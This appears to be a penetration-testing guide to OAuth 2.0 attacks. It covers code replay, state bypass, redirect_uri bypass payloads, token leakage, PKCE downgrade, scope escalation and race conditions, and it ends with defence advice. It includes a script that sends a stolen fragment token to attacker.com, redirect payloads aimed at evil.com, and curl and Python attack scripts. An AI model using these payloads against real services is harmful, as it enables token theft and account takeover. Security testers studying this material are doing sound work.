# OAuth 2.0 Vulnerabilities

## Overview

OAuth 2.0 is the industry-standard protocol for authorization. This document covers comprehensive attack vectors against OAuth implementations, including authorization code flow, implicit flow, client attacks, and token-based exploits.

---

## 1. Authorization Code Flow Attacks

### 1.1 Authorization Code Injection

**Vulnerability**: Attacker injects stolen authorization code into victim's session.

**Attack Flow**:
1. Attacker initiates OAuth flow, captures authorization code before exchange
2. Victim initiates their own OAuth flow
3. Attacker injects captured code into victim's callback
4. Victim's session linked to attacker's account

**Exploitation**:
```bash
# Capture authorization code from callback
# Original: https://app.com/callback?code=AUTH_CODE&state=STATE

# Inject into victim's session (requires CSRF or session manipulation)
# Victim visits: https://app.com/callback?code=ATTACKER_CODE&state=VICTIM_STATE
```

**Detection**:
- Check if state parameter is properly validated
- Verify code is bound to original session
- Test code reuse across sessions

### 1.2 Authorization Code Replay

**Vulnerability**: Authorization codes can be reused multiple times.

**Testing**:
```bash
# Capture valid authorization code
CODE="captured_auth_code"

# First exchange (legitimate)
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=$CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://app.com/callback"

# Replay attempt
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=$CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://app.com/callback"

# If second request succeeds, code replay is possible
```

### 1.3 CSRF Attacks (State Parameter Bypass)

**Vulnerability**: Missing or weak state parameter validation.

**Attack Scenarios**:

**Missing State**:
```
# Authorization request without state
https://auth.target.com/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://app.com/callback
  # No state parameter
```

**Predictable State**:
```python
# Weak state generation patterns to test
weak_states = [
    "1",
    "state",
    "abc123",
    str(int(time.time())),  # Timestamp
    hashlib.md5(session_id.encode()).hexdigest()[:8]  # Weak hash
]
```

**State Fixation**:
```html
<!-- Attacker's page -->
<html>
<body>
  <!-- Initiate OAuth with attacker's state -->
  <img src="https://auth.target.com/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://app.com/callback&state=ATTACKER_STATE">

  <!-- Later: victim's callback with attacker's code -->
  <script>
    // Trick victim to complete flow with attacker's code
  </script>
</body>
</html>
```

**Burp Suite Testing**:
1. Capture `/authorize` request
2. Remove or modify `state` parameter
3. Complete OAuth flow
4. Check if application accepts response

### 1.4 Open Redirect via redirect_uri

**Vulnerability**: Insufficient validation of redirect_uri parameter.

**Attack Variations**:
```bash
# Subdomain takeover
redirect_uri=https://evil.app.com/callback

# Path traversal
redirect_uri=https://app.com/callback/../../../evil/steal

# URL encoding bypass
redirect_uri=https://app.com/callback%2f..%2f..%2fevil

# Parameter pollution
redirect_uri=https://app.com/callback&redirect_uri=https://evil.com

# Fragment injection
redirect_uri=https://app.com/callback#@evil.com

# Scheme bypass
redirect_uri=https://app.com@evil.com/callback

# Null byte injection
redirect_uri=https://app.com/callback%00.evil.com

# Unicode normalization
redirect_uri=https://app.com/callback%E2%81%84evil.com

# Localhost bypass
redirect_uri=https://localhost.evil.com/callback
redirect_uri=https://127.0.0.1.evil.com/callback

# Whitespace bypass
redirect_uri=https://app.com/callback%20.evil.com
```

**Automated Testing with Burp**:
```
# Intruder payload positions
GET /authorize?response_type=code&client_id=ID&redirect_uri=§https://app.com/callback§

# Payload list: redirect_uri variations
https://evil.com
https://app.com.evil.com
https://app.com@evil.com
https://app.com%40evil.com
...
```

### 1.5 State Manipulation

**Vulnerability**: State parameter contains sensitive data or can be tampered.

**Attack Techniques**:
```python
import base64
import json

# Decode state if base64
state = "eyJ1c2VyIjoiYWRtaW4ifQ=="
decoded = base64.b64decode(state)
# {"user": "admin"}

# Modify and re-encode
modified = {"user": "admin", "role": "superuser"}
new_state = base64.b64encode(json.dumps(modified).encode()).decode()
```

**Testing**:
```bash
# Original state
state=eyJ1c2VyIjoiam9obiJ9

# Modified state (if not signed/verified)
state=eyJ1c2VyIjoiYWRtaW4ifQ==

# Test in callback
curl "https://app.com/callback?code=CODE&state=MODIFIED_STATE"
```

---

## 2. Implicit Flow Attacks

### 2.1 Token Leakage via Referrer Header

**Vulnerability**: Access token in URL fragment leaked through Referrer header.

**Attack Scenario**:
```
1. User authenticates, redirected to: https://app.com/callback#access_token=TOKEN
2. App loads external resource (image, script)
3. Referrer header sent to external server contains token
```

**Exploitation**:
```html
<!-- Attacker-controlled content on app page -->
<img src="https://attacker.com/log?ref=true">
<script src="https://attacker.com/evil.js"></script>

<!-- Attacker's server logs Referrer header with token -->
```

**Detection Script**:
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class RefererLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        referer = self.headers.get('Referer', 'None')
        print(f"Referer: {referer}")
        if 'access_token' in referer:
            print(f"TOKEN LEAKED: {referer}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), RefererLogger).serve_forever()
```

### 2.2 Token Leakage via Browser History

**Vulnerability**: Access tokens stored in browser history.

**Attack Scenario**:
```
1. User authenticates, token in URL fragment
2. Some browsers/implementations may store fragment in history
3. Attacker with access to history retrieves token
```

**Testing**:
```javascript
// Check if fragment is stored in history
window.history.pushState({}, '', window.location.href);
console.log(window.location.href);  // Check if token present

// Browser history access (requires privileges)
// chrome://history or browser history export
```

### 2.3 Fragment Handling Issues

**Vulnerability**: Improper handling of URL fragments allows token theft.

**Attack Techniques**:

**Fragment Forwarding**:
```html
<!-- If app redirects and preserves fragment -->
<!-- Step 1: Token issued -->
https://app.com/callback#access_token=TOKEN

<!-- Step 2: App redirects -->
https://app.com/dashboard#access_token=TOKEN

<!-- Step 3: If dashboard loads attacker content -->
<script>
  // Attacker's script can read fragment
  var token = window.location.hash.split('=')[1];
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Fragment in Redirect Chain**:
```bash
# Test fragment preservation
curl -v "https://app.com/callback#access_token=test" 2>&1 | grep -i location
```

---

## 3. Client Attacks

### 3.1 Client Secret Exposure

**Vulnerability**: Client secrets exposed in client-side code, repositories, or logs.

**Common Exposure Locations**:
```bash
# Mobile app decompilation
apktool d app.apk
grep -r "client_secret" ./app/

# JavaScript source
# Browser DevTools -> Sources -> Search for client_secret
grep -r "client_secret" *.js

# Git history
git log -p | grep -i "client_secret"
git log -p | grep -i "oauth"

# Environment files in repos
cat .env | grep -i secret
cat config.js | grep -i secret

# Docker images
docker history --no-trunc IMAGE_ID
docker inspect IMAGE_ID | grep -i secret
```

**Exploitation**:
```bash
# Use exposed credentials
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=client_credentials" \
  -d "client_id=EXPOSED_CLIENT_ID" \
  -d "client_secret=EXPOSED_SECRET"
```

### 3.2 Client Impersonation

**Vulnerability**: Attacker impersonates legitimate client.

**Attack Scenario**:
```bash
# If client_id is known and no secret required (public client)
https://auth.target.com/authorize?
  response_type=token&
  client_id=KNOWN_CLIENT_ID&
  redirect_uri=https://attacker.com/callback&
  scope=openid profile email

# If redirect_uri not strictly validated
# Attacker receives tokens intended for legitimate client
```

### 3.3 Confidential Client Bypass

**Vulnerability**: Confidential client authentication bypassed.

**Testing**:
```bash
# Remove client_secret
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "redirect_uri=https://app.com/callback"
  # No client_secret

# Empty client_secret
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=" \
  -d "redirect_uri=https://app.com/callback"

# client_secret in URL parameter (insecure)
curl "https://auth.target.com/oauth/token?client_secret=SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE"
```

---

## 4. Token Attacks

### 4.1 Access Token Leakage

**Vulnerability**: Access tokens exposed through various channels.

**Leakage Vectors**:
```bash
# URL parameters (insecure)
https://api.target.com/data?access_token=TOKEN

# Logs
grep -r "access_token" /var/log/

# Error messages
curl https://api.target.com/protected \
  -H "Authorization: Bearer invalid" 2>&1

# Cache
curl -I https://api.target.com/data \
  -H "Authorization: Bearer TOKEN"
# Check Cache-Control headers

# CORS responses
# Check if tokens returned in accessible responses
```

### 4.2 Refresh Token Leakage

**Vulnerability**: Refresh tokens exposed or improperly secured.

**Testing**:
```bash
# Check refresh token in responses
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=CODE" \
  -d "client_id=ID" \
  -d "client_secret=SECRET" | jq .refresh_token

# Test refresh token rotation
REFRESH="stolen_refresh_token"
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH" \
  -d "client_id=ID"

# Check if old refresh token still works after rotation
```

### 4.3 Scope Manipulation

**Vulnerability**: Unauthorized scope escalation.

**Attack Techniques**:
```bash
# Request elevated scopes
https://auth.target.com/authorize?
  response_type=code&
  client_id=ID&
  redirect_uri=https://app.com/callback&
  scope=openid profile email admin:full

# Scope injection
scope=openid%20admin
scope=openid+admin
scope=openid,admin

# Scope in token exchange
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=CODE" \
  -d "scope=admin:full" \  # Scope escalation attempt
  -d "client_id=ID"
```

### 4.4 Token Substitution

**Vulnerability**: Tokens from one context accepted in another.

**Attack Scenarios**:
```bash
# Use token from Service A in Service B
TOKEN_FROM_A="eyJ..."
curl https://api-b.target.com/data \
  -H "Authorization: Bearer $TOKEN_FROM_A"

# Use access token as refresh token
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$ACCESS_TOKEN"

# Cross-client token usage
# Token issued for Client A used with Client B
```

---

## 5. PKCE (Proof Key for Code Exchange) Bypass

### 5.1 Missing PKCE Enforcement

**Vulnerability**: Server doesn't require PKCE for public clients.

**Testing**:
```bash
# Authorization request without PKCE
curl "https://auth.target.com/authorize?
  response_type=code&
  client_id=PUBLIC_CLIENT_ID&
  redirect_uri=https://app.com/callback&
  scope=openid"
  # No code_challenge parameter

# If authorization succeeds without PKCE, enforcement is missing
```

### 5.2 Code Verifier Prediction

**Vulnerability**: Weak code_verifier generation.

**Attack Analysis**:
```python
import hashlib
import base64
import secrets

# Proper PKCE (unpredictable)
code_verifier = secrets.token_urlsafe(32)
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).decode().rstrip('=')

# Weak implementations to test
weak_verifiers = [
    "12345678901234567890123456789012345678901234",  # Sequential
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",  # Repeated
    str(int(time.time())),  # Timestamp-based
    hashlib.md5(user_id.encode()).hexdigest(),  # Predictable from user data
]
```

### 5.3 PKCE Downgrade Attacks

**Vulnerability**: Server accepts `plain` method when `S256` was used in authorization.

**Testing**:
```bash
# Authorization with S256
CODE_VERIFIER="random_verifier_string_at_least_43_chars_long"
CODE_CHALLENGE=$(echo -n $CODE_VERIFIER | sha256sum | cut -d' ' -f1 | xxd -r -p | base64 | tr '+/' '-_' | tr -d '=')

curl "https://auth.target.com/authorize?
  response_type=code&
  client_id=ID&
  redirect_uri=https://app.com/callback&
  code_challenge=$CODE_CHALLENGE&
  code_challenge_method=S256"

# Token exchange with plain method (downgrade)
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "code_verifier=$CODE_CHALLENGE" \  # Using challenge as verifier
  -d "client_id=ID"
  # Hoping server accepts plain

# Or with different verifier
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "code_verifier=anything" \
  -d "client_id=ID"
```

### 5.4 Code Challenge Method Confusion

**Vulnerability**: Server doesn't validate code_challenge_method consistently.

```bash
# Test method variations
methods=("S256" "s256" "SHA256" "sha256" "plain" "PLAIN")
for method in "${methods[@]}"; do
  curl "https://auth.target.com/authorize?
    response_type=code&
    client_id=ID&
    code_challenge=test&
    code_challenge_method=$method"
done
```

---

## 6. Advanced OAuth Attacks

### 6.1 Authorization Server Metadata Manipulation

**Vulnerability**: Trusting unvalidated OAuth metadata.

**Attack**:
```bash
# Check metadata endpoint
curl https://auth.target.com/.well-known/oauth-authorization-server
curl https://auth.target.com/.well-known/openid-configuration

# If client fetches metadata dynamically and doesn't pin:
# 1. DNS hijack to serve malicious metadata
# 2. MITM to modify metadata responses
```

### 6.2 Race Conditions in Token Exchange

**Vulnerability**: Authorization code can be exchanged multiple times in race condition.

**Testing**:
```python
import threading
import requests

code = "AUTH_CODE"
results = []

def exchange_code():
    response = requests.post(
        "https://auth.target.com/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "client_id": "ID",
            "client_secret": "SECRET",
            "redirect_uri": "https://app.com/callback"
        }
    )
    results.append(response.json())

# Launch parallel requests
threads = [threading.Thread(target=exchange_code) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Check how many succeeded
successful = [r for r in results if 'access_token' in r]
print(f"Successful exchanges: {len(successful)}")
```

### 6.3 IdP Confusion

**Vulnerability**: Application accepts tokens from multiple IdPs without proper validation.

**Attack**:
```bash
# Register attacker IdP with same client_id
# Configure to issue tokens with elevated claims
# User authenticates with attacker IdP
# Tokens accepted by target application
```

---

## 7. Burp Suite OAuth Testing

### 7.1 Automated Scanning

```
# Configure Burp to handle OAuth
1. Project Options -> Sessions -> Session Handling Rules
2. Add rule to maintain OAuth session
3. Use macro to refresh tokens when expired
```

### 7.2 Manual Testing Workflow

```
1. Map OAuth endpoints:
   - /authorize
   - /token
   - /userinfo
   - /revoke
   - /introspect
   - /.well-known/oauth-authorization-server
   - /.well-known/openid-configuration

2. Test each endpoint:
   - Parameter tampering
   - Missing required parameters
   - Additional unauthorized parameters
   - Scope escalation
   - Redirect URI manipulation

3. Session analysis:
   - Token lifecycle
   - Refresh token behavior
   - Token binding
   - Cross-client token usage
```

### 7.3 Burp Extensions for OAuth

```
- OAuth Tester
- Autorize
- Auth Analyzer
- JSON Web Token Attacker
```

---

## 8. Tool Reference

### 8.1 Manual Testing with cURL

```bash
# Authorization Code Flow
# Step 1: Get authorization code
open "https://auth.target.com/authorize?response_type=code&client_id=ID&redirect_uri=https://app.com/callback&scope=openid&state=random123"

# Step 2: Exchange code for tokens
curl -X POST https://auth.target.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "code=CAPTURED_CODE" \
  -d "client_id=ID" \
  -d "client_secret=SECRET" \
  -d "redirect_uri=https://app.com/callback"

# Refresh token
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=REFRESH_TOKEN" \
  -d "client_id=ID" \
  -d "client_secret=SECRET"

# Token introspection
curl -X POST https://auth.target.com/oauth/introspect \
  -u "ID:SECRET" \
  -d "token=ACCESS_TOKEN"

# Token revocation
curl -X POST https://auth.target.com/oauth/revoke \
  -u "ID:SECRET" \
  -d "token=ACCESS_TOKEN"
```

### 8.2 Postman OAuth Testing

```
1. Create new request
2. Authorization tab -> OAuth 2.0
3. Configure:
   - Grant Type: Authorization Code
   - Callback URL: Your callback
   - Auth URL: https://auth.target.com/authorize
   - Access Token URL: https://auth.target.com/token
   - Client ID/Secret: As configured
4. "Get New Access Token"
5. Inspect token flow in Console
```

### 8.3 Python OAuth Testing Script

```python
import requests
from urllib.parse import urlencode, parse_qs, urlparse

class OAuthTester:
    def __init__(self, auth_url, token_url, client_id, client_secret):
        self.auth_url = auth_url
        self.token_url = token_url
        self.client_id = client_id
        self.client_secret = client_secret

    def test_redirect_uri_bypass(self, valid_redirect, test_redirects):
        """Test redirect_uri validation"""
        results = []
        for redirect in test_redirects:
            params = {
                'response_type': 'code',
                'client_id': self.client_id,
                'redirect_uri': redirect,
                'scope': 'openid'
            }
            response = requests.get(
                self.auth_url,
                params=params,
                allow_redirects=False
            )
            results.append({
                'redirect_uri': redirect,
                'status': response.status_code,
                'accepted': response.status_code != 400
            })
        return results

    def test_scope_escalation(self, base_scope, elevated_scopes):
        """Test scope escalation"""
        results = []
        for scope in elevated_scopes:
            params = {
                'response_type': 'code',
                'client_id': self.client_id,
                'redirect_uri': 'https://app.com/callback',
                'scope': f"{base_scope} {scope}"
            }
            response = requests.get(
                self.auth_url,
                params=params,
                allow_redirects=False
            )
            results.append({
                'scope': scope,
                'status': response.status_code,
                'accepted': response.status_code in [200, 302]
            })
        return results

    def test_pkce_enforcement(self):
        """Test if PKCE is enforced"""
        # Without PKCE
        params = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': 'https://app.com/callback',
            'scope': 'openid'
        }
        response = requests.get(
            self.auth_url,
            params=params,
            allow_redirects=False
        )
        return {
            'pkce_required': response.status_code == 400,
            'status': response.status_code
        }

# Usage
tester = OAuthTester(
    'https://auth.target.com/authorize',
    'https://auth.target.com/token',
    'CLIENT_ID',
    'CLIENT_SECRET'
)

# Test redirect URI bypass
redirects = [
    'https://evil.com',
    'https://app.com.evil.com',
    'https://app.com@evil.com/callback',
]
print(tester.test_redirect_uri_bypass('https://app.com/callback', redirects))
```

---

## 9. Defense Recommendations

### 9.1 Authorization Server

```
- Validate redirect_uri against exact whitelist
- Enforce state parameter validation
- Implement PKCE for public clients (require S256)
- Single-use authorization codes
- Short-lived access tokens (5-15 minutes)
- Secure refresh token storage and rotation
- Implement token binding
- Proper scope validation
```

### 9.2 Client Application

```
- Use authorization code flow with PKCE
- Never store secrets in client-side code
- Validate state parameter
- Use secure token storage
- Implement proper logout (token revocation)
- Validate token claims (iss, aud, exp)
```

### 9.3 Token Security

```
- Use short expiration times
- Implement token revocation
- Bind tokens to client/user context
- Use opaque tokens where possible
- Monitor for token abuse
- Implement rate limiting
```

---

## 10. Cheat Sheet

| Attack | Test Method | Key Indicator |
|--------|-------------|---------------|
| State Bypass | Remove state parameter | Request accepted |
| Redirect URI Open Redirect | Modify redirect_uri | Redirects to attacker |
| Code Replay | Reuse authorization code | Second exchange succeeds |
| Scope Escalation | Add elevated scopes | Higher privileges granted |
| PKCE Bypass | Omit code_challenge | Request accepted |
| Token Leakage | Check logs/referrer/cache | Token visible |
| Client Secret Exposure | Search repos/code | Secret found |
| Token Substitution | Use token cross-context | Token accepted |

---

## References

- RFC 6749 - OAuth 2.0 Authorization Framework
- RFC 6750 - Bearer Token Usage
- RFC 7636 - PKCE
- RFC 8252 - OAuth for Native Apps
- OAuth 2.0 Security Best Current Practice (RFC Draft)
- OWASP OAuth Security Cheat Sheet
- PortSwigger Web Security Academy - OAuth Authentication
